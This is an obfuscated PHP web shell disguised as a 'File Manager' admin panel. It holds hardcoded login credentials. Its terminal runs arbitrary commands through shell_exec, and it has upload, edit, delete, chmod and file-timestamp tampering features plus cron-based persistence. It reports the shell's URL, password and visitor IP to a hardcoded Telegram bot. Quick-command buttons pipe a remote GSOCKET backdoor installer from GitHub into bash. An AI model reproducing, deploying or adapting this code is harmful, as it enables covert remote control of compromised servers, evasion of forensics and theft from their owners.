<?php
 goto aDFPg; DxzZ4: set_time_limit(0); goto oFZp0; aDFPg: ob_start(); goto nkoSE; ZVWP0: $PyYOR = scandir($CyO_D); goto EJFRx; jW88a: function sendTelegramMessage($cffHx, $wG13W, $Hrfxn) { goto JU10O; DwkQr: $GxERH = ["http" => ["method" => "POST", "header" => "Content-Type: application/x-www-form-urlencoded", "content" => http_build_query($uDNax)]]; goto QJ_7L; zpMfU: $uDNax = ["chat_id" => $wG13W, "text" => $Hrfxn]; goto DwkQr; QJ_7L: $BqZ1Q = stream_context_create($GxERH); goto uVlko; JU10O: $kb2ip = "https://api.telegram.org/bot{$cffHx}/sendMessage"; goto zpMfU; uVlko: $Gk_QG = file_get_contents($kb2ip, false, $BqZ1Q); goto SHL3N; SHL3N: } goto AfSmZ; VHfel: $dt2B5 = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]; goto IiZ04; Q_OCx: if (isset($_POST["add_proteksi"])) { goto GLaDw; VyF7K: $_SESSION["message"] = "File added to protection successfully"; goto uYcTL; GLaDw: $d2PXX = file_exists($Cd7Kn) ? json_decode(file_get_contents($Cd7Kn), true) : []; goto BrAkE; GgMGg: file_put_contents($Cd7Kn, json_encode($d2PXX, JSON_PRETTY_PRINT)); goto VyF7K; uYcTL: header("Location: " . $_SERVER["PHP_SELF"]); goto zurMc; zurMc: exit; goto vA8MF; BrAkE: $d2PXX[] = ["target" => $_POST["target_file"], "backupUrl" => $_POST["backup_url"]]; goto GgMGg; vA8MF: } goto Oa3xz; fwce4: if (isset($_SESSION["message"])) { echo '<div class="alert alert-success">' . $_SESSION["message"] . "</div>"; unset($_SESSION["message"]); } goto DDwoC; dkxfI: echo '<div id="file-manager" class="tab-content ' . ($UZrOo === "file-manager" ? "active" : "") . '">
            <div class="breadcrumb">
                <a href="?path=' . urlencode(dirname($CyO_D)) . '&tab=file-manager">Up</a>
                <span class="breadcrumb-separator">/</span>
                <span>' . htmlspecialchars($CyO_D) . '</span>
            </div>
            
            <div class="file-actions">
                <form method="POST" enctype="multipart/form-data" style="display: flex; gap: 10px; width: 100%;">
                    <input type="file" name="upload" class="form-control" style="flex: 1;">
                    <button type="submit" name="up" class="btn btn-primary">Upload</button>
                </form>
            </div>
            
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>'; goto ZVWP0; PJI1Z: echo '</div>
    </div>'; goto Pyqlr; Z3tgf: $cffHx = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8"; goto gynnd; F98zn: echo '<div id="cron" class="tab-content ' . ($UZrOo === "cron" ? "active" : "") . '">
        <div style="background-color: white; padding: 20px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
            <h3>Cron Job Setup</h3>
            <p>To set up automatic file protection monitoring, add this to your crontab:</p>
            
            <div style="background-color: var(--light); padding: 15px; border-radius: 4px; margin-bottom: 20px;">
                <code>*/5 * * * * /usr/bin/php ' . htmlspecialchars(__FILE__) . ' --cron</code>
            </div>
            
            <p>Or run this command to add it automatically:</p>
            
            <div style="background-color: var(--light); padding: 15px; border-radius: 4px;">
                <code>(crontab -l ; echo "*/5 * * * * /usr/bin/php ' . htmlspecialchars(__FILE__) . ' --cron") | crontab -</code>
            </div>
        </div>
    </div>'; goto F0QTt; UQ024: if (isset($_GET["chmod"]) && isset($_POST["mode"])) { goto S0C6I; h2jLv: $xIiP6 = octdec($_POST["mode"]); goto hndUD; S0C6I: $ysHcB = $CyO_D . "/" . $_GET["chmod"]; goto h2jLv; PUEp3: header("Location: ?path=" . urlencode($CyO_D)); goto t6pye; hndUD: if (chmod($ysHcB, $xIiP6)) { $_SESSION["message"] = "Permissions changed successfully"; } else { $_SESSION["error"] = "Failed to change permissions"; } goto PUEp3; t6pye: exit; goto EE9B2; EE9B2: } goto Ui9zi; A4E0I: echo '<div id="file-protection" class="tab-content ' . ($UZrOo === "file-protection" ? "active" : "") . '">
        <div class="protection-form">
            <h3>Add File Protection</h3>
            <form method="POST">
                <div class="form-group">
                    <label class="form-label">File Path</label>
                    <input type="text" name="target_file" class="form-control" placeholder="/path/to/file.php" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Backup URL</label>
                    <input type="text" name="backup_url" class="form-control" placeholder="https://example.com/backup.txt" required>
                </div>
                <button type="submit" name="add_proteksi" class="btn btn-primary">Add Protection</button>
            </form>
        </div>
        
        <div class="protection-list">
            <h3>Protected Files</h3>'; goto JBF5I; soiL0: function formatSize($vydp_) { if ($vydp_ >= 1073741824) { return number_format($vydp_ / 1073741824, 2) . " GB"; } elseif ($vydp_ >= 1048576) { return number_format($vydp_ / 1048576, 2) . " MB"; } elseif ($vydp_ >= 1024) { return number_format($vydp_ / 1024, 2) . " KB"; } return $vydp_ . " bytes"; } goto eLSgX; s621z: if (!realpath($CyO_D)) { $CyO_D = getcwd(); } goto yRcec; AfSmZ: if (!isset($_SESSION["logged_in"])) { goto qj9Ww; OPac0: exit; goto VG9mG; xqE2D: echo '<form method="POST">
                <div class="form-group">
                    <label for="user">Username</label>
                    <input type="text" id="user" name="user" placeholder="Enter username" required>
                </div>
                <div class="form-group">
                    <label for="pass">Password</label>
                    <input type="password" id="pass" name="pass" placeholder="Enter password" required>
                </div>
                <button type="submit" class="btn">Sign In</button>
            </form>
        </div>
    </body>
    </html>'; goto OPac0; jtLZ1: if (isset($ZuWOZ)) { echo "<div class='error-message'>{$ZuWOZ}</div>"; } goto xqE2D; mmk6J: echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Login Admin</title>
        <style>
            :root {
                --primary: #4361ee;
                --secondary: #3f37c9;
                --dark: #212529;
                --light: #f8f9fa;
                --danger: #e63946;
                --success: #2a9d8f;
            }
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
                font-family: "Segoe UI", Roboto, sans-serif;
            }
            body {
                background-color: var(--light);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            .login-container {
                background: white;
                border-radius: 8px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                width: 100%;
                max-width: 400px;
                padding: 40px;
            }
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            .login-header h2 {
                color: var(--dark);
                margin-bottom: 10px;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: var(--dark);
                font-weight: 500;
            }
            .form-group input {
                width: 100%;
                padding: 12px 15px;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-size: 16px;
                transition: border 0.3s;
            }
            .form-group input:focus {
                border-color: var(--primary);
                outline: none;
            }
            .btn {
                width: 100%;
                padding: 12px;
                background-color: var(--primary);
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                cursor: pointer;
                transition: background 0.3s;
            }
            .btn:hover {
                background-color: var(--secondary);
            }
            .error-message {
                color: var(--danger);
                text-align: center;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h2>SILAHKAN LOGIN KALAU MAU MASUK PENJARA!!</h2>
                <p>Please sign in to continue</p>
            </div>'; goto jtLZ1; qj9Ww: if (isset($_POST["user"]) && isset($_POST["pass"])) { if ($_POST["user"] === $ZrScn && $_POST["pass"] === $CXX_F) { goto imtZY; imtZY: $_SESSION["logged_in"] = true; goto w6Fr7; w6Fr7: header("Location: " . $_SERVER["PHP_SELF"]); goto OtrbZ; OtrbZ: exit; goto JruQI; JruQI: } else { echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>'; $ZuWOZ = "JARINGAN TERPUTUS SILAHKAN LOGIN KEMBALI"; } } goto mmk6J; VG9mG: } goto Q_OCx; eLSgX: function perms($ysHcB) { return substr(sprintf("%o", fileperms($ysHcB)), -4); } goto qLC_g; DDwoC: if (isset($_SESSION["error"])) { echo '<div class="alert alert-danger">' . $_SESSION["error"] . "</div>"; unset($_SESSION["error"]); } goto XDB7u; OdaXg: $CyO_D = isset($_GET["path"]) ? $_GET["path"] : getcwd(); goto s621z; Ui9zi: if (isset($_GET["touch"]) && isset($_POST["newdate"])) { goto G9tNm; Rr2QS: header("Location: ?path=" . urlencode($CyO_D)); goto i06WA; G9tNm: $ysHcB = $CyO_D . "/" . $_GET["touch"]; goto tARuA; iIsla: if (touch($ysHcB, $pLJIC)) { $_SESSION["message"] = "File date modified successfully"; } else { $_SESSION["error"] = "Failed to modify file date"; } goto Rr2QS; i06WA: exit; goto BCcdz; tARuA: $pLJIC = strtotime($_POST["newdate"]); goto iIsla; BCcdz: } goto JkBD3; qM_TD: echo '</tbody>
        </table>
    </div>'; goto A4E0I; yRcec: chdir($CyO_D); goto soiL0; aF3Vn: if (isset($_GET["delete"])) { goto cFZ_P; iGQv0: if (is_file($vBch3)) { @chmod($vBch3, 0777); if (@unlink($vBch3)) { $_SESSION["message"] = "File deleted successfully"; } else { $_SESSION["error"] = "Failed to delete file"; } } elseif (is_dir($vBch3)) { goto QmW1t; QmW1t: @chmod($vBch3, 0777); goto UNFk5; RFk2o: foreach ($PyYOR as $ysHcB) { if ($ysHcB->isDir()) { @rmdir($ysHcB->getRealPath()); } else { @unlink($ysHcB->getRealPath()); } } goto VHBeo; UNFk5: $PyYOR = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($vBch3, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST); goto RFk2o; VHBeo: if (@rmdir($vBch3)) { $_SESSION["message"] = "Directory deleted successfully"; } else { $_SESSION["error"] = "Failed to delete directory"; } goto bUvFD; bUvFD: } goto FoAJ3; cFZ_P: $vBch3 = $CyO_D . "/" . $_GET["delete"]; goto iGQv0; o4sbX: exit; goto erGQ0; FoAJ3: header("Location: ?path=" . urlencode($CyO_D)); goto o4sbX; erGQ0: } goto HOAuo; oFZp0: $ZrScn = "admin"; goto rY7CE; Oa3xz: if (isset($_GET["del_proteksi"])) { goto KuLdb; vXsew: exit; goto WCLn6; I8psN: unset($d2PXX[$_GET["del_proteksi"]]); goto XAYYn; XAYYn: file_put_contents($Cd7Kn, json_encode(array_values($d2PXX), JSON_PRETTY_PRINT)); goto aDSw7; muaXI: header("Location: " . $_SERVER["PHP_SELF"]); goto vXsew; KuLdb: $d2PXX = json_decode(file_get_contents($Cd7Kn), true); goto I8psN; aDSw7: $_SESSION["message"] = "File removed from protection"; goto muaXI; WCLn6: } goto OdaXg; EJFRx: foreach ($PyYOR as $ysHcB) { goto a38dF; pKhHj: $Lr7h0 = $CyO_D . "/" . $ysHcB; goto OIG1U; Qn6S2: echo '<tr>
            <td>
                <div class="file-name">
                    <span class="file-icon">' . ($wbjZL ? "&#128193;" : "&#128196;") . '</span>
                    ' . ($wbjZL ? '<a href="?path=' . urlencode($Lr7h0) . '&tab=file-manager">' . htmlspecialchars($ysHcB) . "</a>" : htmlspecialchars($ysHcB)) . '
                </div>
            </td>
            <td>' . ($wbjZL ? "-" : formatSize(filesize($Lr7h0))) . '</td>
            <td>' . perms($Lr7h0) . '</td>
            <td>' . date("Y-m-d H:i:s", filemtime($Lr7h0)) . '</td>
            <td>
                <div class="file-actions-cell">
                    ' . (!$wbjZL ? '<a href="?edit=' . urlencode($ysHcB) . "&path=" . urlencode($CyO_D) . '" class="btn btn-outline">Edit</a>' : "") . '
                    
                    <a href="?delete=' . urlencode($ysHcB) . "&path=" . urlencode($CyO_D) . '" 
                       onclick="return confirm(\'Are you sure you want to delete ' . htmlspecialchars($ysHcB) . '?\')" 
                       class="btn btn-danger">Delete</a>
                    
                    <form class="rename-form" method="POST" action="?rename=' . urlencode($ysHcB) . "&path=" . urlencode($CyO_D) . '">
                        <input type="text" name="newname" value="' . htmlspecialchars($ysHcB) . '" 
                               class="rename-input" required>
                        <button type="submit" class="btn btn-primary">Rename</button>
                    </form>
                    
                    <form method="POST" action="?chmod=' . urlencode($ysHcB) . "&path=" . urlencode($CyO_D) . '">
                        <input type="text" name="mode" placeholder="0755" value="' . perms($Lr7h0) . '" size="4" required>
                        <button type="submit" class="btn btn-outline">Chmod</button>
                    </form>
                    
                    <form method="POST" action="?touch=' . urlencode($ysHcB) . "&path=" . urlencode($CyO_D) . '">
                        <input type="datetime-local" name="newdate" value="' . date("Y-m-d\\TH:i:s", filemtime($Lr7h0)) . '" required>
                        <button type="submit" class="btn btn-outline">Date</button>
                    </form>
                </div>
            </td>
        </tr>'; goto BbY1Y; OIG1U: $wbjZL = is_dir($Lr7h0); goto Qn6S2; a38dF: if ($ysHcB == "." || $ysHcB == "..") { continue; } goto pKhHj; BbY1Y: } goto qM_TD; sSMuW: if (isset($_GET["rename"]) && isset($_POST["newname"])) { goto G3Q2z; oyyJx: if (empty($_POST["newname"])) { $_SESSION["error"] = "New name cannot be empty"; } elseif (preg_match('/[\\/\\\\:*?"<>|]/', $_POST["newname"])) { $_SESSION["error"] = "Invalid characters in filename"; } elseif (!file_exists($p7CIL)) { $_SESSION["error"] = "File/folder does not exist"; } elseif (file_exists($K_yCQ)) { $_SESSION["error"] = "A file/folder with that name already exists"; } elseif (rename($p7CIL, $K_yCQ)) { $_SESSION["message"] = "Successfully renamed " . htmlspecialchars($_GET["rename"]) . " to " . htmlspecialchars($_POST["newname"]); } else { $_SESSION["error"] = "Failed to rename file/folder"; } goto MyMS9; hUeDL: $K_yCQ = $CyO_D . "/" . $_POST["newname"]; goto oyyJx; G3Q2z: $p7CIL = $CyO_D . "/" . $_GET["rename"]; goto hUeDL; MyMS9: header("Location: ?path=" . urlencode($CyO_D)); goto gFA9r; gFA9r: exit; goto ZPU0a; ZPU0a: } goto UQ024; KA472: if (isset($_SESSION["ssh_output"])) { echo '<div class="terminal-output">' . $_SESSION["ssh_output"] . "</div>"; unset($_SESSION["ssh_output"]); } goto ZL13f; GiW1U: sendTelegramMessage($cffHx, $wG13W, $Pcraz); goto OyVEg; OyVEg: if (isset($_GET["logout"])) { goto AMlMk; AMlMk: session_destroy(); goto jkEcv; jkEcv: header("Location: " . $_SERVER["PHP_SELF"]); goto LdUxg; LdUxg: exit; goto sfcCs; sfcCs: } goto jW88a; nkoSE: session_start(); goto DxzZ4; owQvc: $Cd7Kn = __DIR__ . "/.proteksi_config.json"; goto x44gY; rY7CE: $CXX_F = "040602"; goto owQvc; gynnd: $wG13W = "8478623770"; goto VHfel; JBF5I: if (file_exists($Cd7Kn)) { $d2PXX = json_decode(file_get_contents($Cd7Kn), true); if (!empty($d2PXX)) { foreach ($d2PXX as $DUOVH => $ysHcB) { echo '<div class="protection-item">
                    <div>
                        <strong>' . htmlspecialchars($ysHcB["target"]) . '</strong><br>
                        <small>' . htmlspecialchars($ysHcB["backupUrl"]) . '</small>
                    </div>
                    <a href="?del_proteksi=' . $DUOVH . '&tab=file-protection" class="btn btn-danger">Remove</a>
                </div>'; } } else { echo "<p>No files are currently protected.</p>"; } } else { echo "<p>No protection configuration found.</p>"; } goto PJI1Z; x44gY: $Ld8YO = __DIR__ . "/.proteksi_log.txt"; goto Z3tgf; Pyqlr: echo '<div id="terminal" class="tab-content ' . ($UZrOo === "terminal" ? "active" : "") . '">
        <div class="terminal">
            <h3 style="color: white; margin-bottom: 15px;">Terminal</h3>
            <form method="POST">
                <div class="terminal-input">
                    <input type="text" name="ssh_cmd" placeholder="Enter command..." required>
                    <button type="submit">Execute</button>
                </div>
            </form>
            
            <div class="quick-commands">
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'ls -la\'">List Files</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'df -h\'">Disk Space</button>
  <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'crontab -l\'">cek crontab</button>
  <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'pkill defunct\'">kill defunct</button>
  <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'chmod -R 777\'">CHMOD All File & Folder</button>
  <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'crontab -r\'">menghapus crontab</button
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'free -m\'">Memory</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\' sh -c bash -c \\"\\$(wget --no-verbose -O- https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/y)\\"\'">GSOCKET Installer</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/y)" || GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" \'">UNISTALL GSOCKET</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'service apache2 status\'">Apache Status</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'tail -n 50 /var/log/apache2/error.log\'">View Logs</button>
            </div>'; goto KA472; HOAuo: if (isset($_POST["ssh_cmd"])) { goto nO7LC; BREGO: header("Location: " . $_SERVER["PHP_SELF"] . "?tab=terminal"); goto pNeQz; pNeQz: exit; goto CBn6B; b7dCh: $vqjRI = shell_exec("{$NRQqG} 2>&1"); goto HtM5Q; nO7LC: $NRQqG = $_POST["ssh_cmd"]; goto b7dCh; HtM5Q: $_SESSION["ssh_output"] = htmlspecialchars($vqjRI); goto BREGO; CBn6B: } goto cCzyy; IiZ04: $Pcraz = "___APACHE TOP99___ \n\n Shell nya =\n {$dt2B5} \n\n Password =\n {$CXX_F} \n\n IP Hacker  :\n [ " . $_SERVER["REMOTE_ADDR"] . " ]"; goto GiW1U; JkBD3: if (isset($_GET["edit"])) { goto jeWHA; CBqDt: echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Edit File</title>
        <style>
            :root {
                --primary: #4361ee;
                --dark: #212529;
                --light: #f8f9fa;
            }
            * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "Segoe UI", Roboto, sans-serif;
        }
        
        body {
            background-color: var(--light);
            color: var(--dark);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border);
        }
        
            .editor-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
            }
            .editor-title {
                font-size: 20px;
                color: var(--dark);
            }
            textarea {
                width: 100%;
                height: 500px;
                padding: 15px;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-family: "Courier New", monospace;
                font-size: 14px;
            }
            .btn {
                padding: 8px 16px;
                background-color: var(--primary);
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="editor-container">
            <div class="editor-header">
                <h2 class="editor-title">Editing: ' . htmlspecialchars($_GET["edit"]) . '</h2>
                <a href="?path=' . urlencode($CyO_D) . '" class="btn">Back</a>
            </div>
            <form method="POST">
                <textarea name="content">' . $VwJdW . '</textarea>
                <div style="margin-top: 15px;">
                    <button type="submit" class="btn">Save Changes</button>
                </div>
            </form>
        </div>
    </body>
    </html>'; goto ha8H2; wJjvg: $VwJdW = file_exists($ysHcB) ? htmlspecialchars(file_get_contents($ysHcB)) : ""; goto CBqDt; dUZEK: if (isset($_POST["content"])) { if (file_put_contents($ysHcB, $_POST["content"]) !== false) { goto Z6myI; lNLbf: header("Location: ?path=" . urlencode($CyO_D)); goto bKQpJ; bKQpJ: exit; goto DJ6SX; Z6myI: $_SESSION["message"] = "File saved successfully"; goto lNLbf; DJ6SX: } else { $_SESSION["error"] = "Failed to save file"; } } goto wJjvg; jeWHA: $ysHcB = $CyO_D . "/" . $_GET["edit"]; goto dUZEK; ha8H2: exit; goto KaUTm; KaUTm: } goto aF3Vn; qLC_g: if (isset($_POST["up"]) && isset($_FILES["upload"])) { goto TnFub; uK5i5: header("Location: ?path=" . urlencode($CyO_D)); goto IXvo9; TnFub: $eYSaz = $CyO_D . "/" . basename($_FILES["upload"]["name"]); goto J33GH; J33GH: if (move_uploaded_file($_FILES["upload"]["tmp_name"], $eYSaz)) { $_SESSION["message"] = "File uploaded successfully"; } else { $_SESSION["error"] = "Failed to upload file"; } goto uK5i5; IXvo9: exit; goto xmVyX; xmVyX: } goto sSMuW; XDB7u: $UZrOo = isset($_GET["tab"]) ? $_GET["tab"] : "file-manager"; goto dkxfI; ZL13f: echo '</div>
    </div>'; goto F98zn; cCzyy: echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        :root {
            --primary: #4361ee;
            --primary-dark: #3f37c9;
            --secondary: #3a86ff;
            --danger: #e63946;
            --warning: #ffbe0b;
            --success: #2a9d8f;
            --dark: #212529;
            --gray: #6c757d;
            --light: #f8f9fa;
            --border: #dee2e6;
        }
        
        * {
           
            margin: 0;
            padding: 0;
            font-family: "Segoe UI", Roboto, sans-serif;
        }
        
        body {
            background-color: var(--light);
            color: var(--dark);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border);
        }
        
        .header h1 {
            font-size: 50px;
            color: var(--dark);
        }
        
        /* Tabs */
        .tabs {
            display: flex;
            border-bottom: 1px solid var(--border);
            margin-bottom: 20px;
        }
        
        .tab-btn {
            padding: 12px 20px;
            background: none;
            border: none;
            cursor: pointer;
            font-size: 16px;
            color: var(--gray);
            border-bottom: 2px solid transparent;
            transition: all 0.3s;
        }
        
        .tab-btn.active {
            color: var(--primary);
            border-bottom-color: var(--primary);
            font-weight: 600;
        }
        
        .tab-btn:hover:not(.active) {
            color: var(--dark);
        }
        
        .tab-content {
            display: none;
            padding: 20px 0;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Alerts */
        .alert {
            padding: 12px 15px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        
        .alert-success {
            background-color: rgba(42, 157, 143, 0.2);
            color: var(--success);
            border-left: 4px solid var(--success);
        }
        
        .alert-danger {
            background-color: rgba(230, 57, 70, 0.2);
            color: var(--danger);
            border-left: 4px solid var(--danger);
        }
        
        /* Breadcrumb */
        .breadcrumb {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding: 10px 15px;
            background-color: white;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .breadcrumb a {
            color: var(--primary);
            text-decoration: none;
            margin: 0 5px;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .breadcrumb-separator {
            color: var(--gray);
        }
        
        /* File Manager */
        .file-actions {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }.btn {
            padding: 8px 16px;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid transparent;
        }
        
        .btn-primary {
            background-color: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background-color: var(--primary-dark);
        }
        
        .btn-outline {
            background-color: white;
            border-color: var(--border);
            color: var(--dark);
        }
        
        .btn-outline:hover {
            background-color: var(--light);
        }
        
        .btn-danger {
            background-color: var(--danger);
            color: white;
        }
        
        .btn-danger:hover {
            background-color: #c1121f;
        }
        
        /* File Table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            background-color: white;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            border-radius: 4px;
            overflow: hidden;
        }
        
        .file-table th {
            background-color: var(--light);
            padding: 12px 15px;
            text-align: left;
            font-weight: 500;
        }
        
        .file-table td {
            padding: 12px 15px;
            border-top: 1px solid var(--border);
        }
        
        .file-table tr:hover {
            background-color: rgba(58, 134, 255, 0.05);
        }
        
        .file-icon {
            margin-right: 8px;
        }
        
        .file-name {
            display: flex;
            align-items: center;
        }
        
        .file-actions-cell {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .file-actions-cell .btn {
            padding: 4px 8px;
            font-size: 13px;
        }
        
        /* Forms */
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid var(--border);
            border-radius: 4px;
            font-size: 14px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
        }
        
        /* Protection Tab */
        .protection-form {
            background-color: white;
            padding: 20px;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        .protection-list {
            background-color: white;
            padding: 20px;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .protection-item {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid var(--border);
        }
        
        .protection-item:last-child {
            border-bottom: none;
        }
        
        /* SSH Terminal */
        .terminal {
            background-color: #1e1e1e;
            color: #f0f0f0;
            padding: 20px;
            border-radius: 4px;
            font-family: "Courier New", monospace;
            margin-bottom: 20px;
        }
        
        .terminal-output {
            height: 300px;
            overflow-y: auto;
            margin-bottom: 15px;
            white-space: pre-wrap;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
        }
        
        .terminal-input input {
            flex: 1;
            background-color: #2d2d2d;
            border: 1px solid #444;
            color: #f0f0f0;
            padding: 10px;
            border-radius: 4px;
        }
        
        .terminal-input button {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .quick-commands {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .quick-commands button {
            background-color: var(--light);
            border: 1px solid var(--border);
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 13px;
        }
        
        /* Rename Form Styles */
        .rename-form {
            display: inline-flex;
            gap: 5px;
            align-items: center;
        }
        
        .rename-input {
            padding: 4px 8px;
            border: 1px solid var(--border);
            border-radius: 4px;
            width: 150px;
            font-size: 10px;
        }
        
        /* Responsive */
        @media (max-width: 420px) {
            .file-table {
                display: block;
                overflow-x: auto;
            }
            
            .file-actions {
                flex-direction: column;
            }
            
            .file-actions-cell {
                flex-direction: column;
                align-items: flex-start;
                gap: 5px;
            }
            
            .rename-form {
                width: 100%;
            }
            
            .rename-input {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>File Manager</h1>
            <div>
                <a href="?logout" class="btn btn-outline">Logout</a>
            </div>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" data-tab="file-manager">File Manager</button>
            <button class="tab-btn" data-tab="file-protection">File Protection</button>
            <button class="tab-btn" data-tab="terminal">Terminal</button>
            <button class="tab-btn" data-tab="cron">Cron Jobs</button>
        </div>'; goto fwce4; F0QTt: echo '<script>
        // Tab functionality
        document.querySelectorAll(".tab-btn").forEach(btn => {
            btn.addEventListener("click", function() {
                const tabId = this.getAttribute("data-tab");
                window.location.href = "?path=' . urlencode($CyO_D) . '&tab=" + tabId;
            });
        });
        
        // Set active tab based on URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const activeTab = urlParams.get("tab") || "file-manager";
        document.querySelector(`.tab-btn[data-tab="${activeTab}"]`).classList.add("active");
        document.getElementById(activeTab).classList.add("active");
        
        // Enhanced rename validation
        document.querySelectorAll(".rename-form").forEach(form => {
            form.addEventListener("submit", function(e) {
                const newName = this.querySelector(".rename-input").value;
                let originalName = this.getAttribute("action").split("rename=")[1].split("&")[0];
                originalName = decodeURIComponent(originalName);
                
                // Don\'t submit if name didn\'t change
                if (newName === originalName) {
                    e.preventDefault();
                    alert("Please enter a different name");
                    return false;
                }
                
                return true;});
        });
    </script>
</body>
</html>';